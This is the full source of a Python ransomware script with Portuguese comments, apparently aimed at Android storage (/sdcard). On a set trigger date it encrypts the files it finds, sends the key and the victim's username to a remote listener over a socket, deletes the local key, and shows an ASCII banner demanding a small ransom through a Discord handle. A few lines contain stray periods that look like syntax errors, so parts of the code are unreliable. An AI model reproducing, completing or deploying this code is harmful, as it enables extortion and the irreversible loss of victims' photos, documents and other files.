#!/bin/python3
import os,sys,socket,time,getpass,os.path
from cryptography.fernet import Fernet
from datetime import date
from pathlib import Path

#cores
red='\033[0;31;0m'
green='\033[0;32;0m'
# Variaveis
lhost='localhost'     # Host que ira receber a chave
lport=51762.          # port
addr=(lhost, lport)
whoami=getpass.getuser().   # pegar usuario do alvo
root_dir='/sdcard' # diretorio que ira ser encryptado
format='utf-8'
all_files = []
banner = f'''{green}\033[0;31;0m

                                                              
        **                                                    
     *****            *                                       
    *  ***           **                                       
       ***           **                                       
      *  **        ********                                   
      *  **       ********     ***    ***  ****       ****    
     *    **         **       * ***    **** **** *   * ***  * 
     *    **         **      *   ***    **   ****   *   ****  
    *      **        **     **    ***   **    **   **    **   
    *********        **     ********    **    **   **    **   
   *        **       **     *******     **    **   **    **   
   *        **       **     **          **    **   **    **   
  *****      **      **     ****    *   **    **   **    **   
 *   ****    ** *     **     *******    ***   ***   ***** **  
*     **      **              *****      ***   ***   ***   ** 
*

      Ola todos os seus arquivos foram encryptados!
      Caso queira resgatar seuas fotos, videos, pdf etc...
      entre em contato cmg atraves o discord abaixo, preco
      do resgate R$25.

                        discord:
                    {red}Mikelodoen#2823{green}

'''
# Listar arquivos

def list_files(base_dir):
    global all_files
    for entry in os.listdir(base_dir):
        
        if entry == sys.argv[0] or entry == "key.key" or entry == "decrypt.py":
            continue
        if os.path.isdir(os.path.join(base_dir, entry)):
            list_files(os.path.join(base_dir, entry))
        elif os.path.isfile(os.path.join(base_dir, entry)):
            all_files.append(os.path.join(base_dir, entry))
      
today = date.today()
if '2022-12-12' == str(today):
 attack='start'
 while True:
# Descrypt
  if(os.path.isfile('.trava.txt')):
    os.system('clear')
    print (banner)
    sys.exit()
# Encrypt
  else:
    key = Fernet.generate_key()
    list_files(root_dir)

    with open('key.key', 'wb') as keyfile:
      keyfile.write(key)

    # Send server key
    s = socket.socket()
    s.connect(addr)
    file = open('key.key', 'r')
    data = file.read()
    s.send(str(f'7777 {data} {whoami}').encode(format))
    s.close()
    os.system('rm key.key')
    for file in all_files:
      sz = Path(file).stat().st_size
      if sz < 10000000:
       with open(file, 'rb') as raw_file:
        contents = raw_file.read()
       enc_contents = Fernet(key).encrypt(contents)
       with open(file, 'wb') as raw_file:
        raw_file.write(enc_contents)
      else:
          rr=0
    os.system('echo trava > .trava.txt')
    print(banner)
else:
    sys.exit()
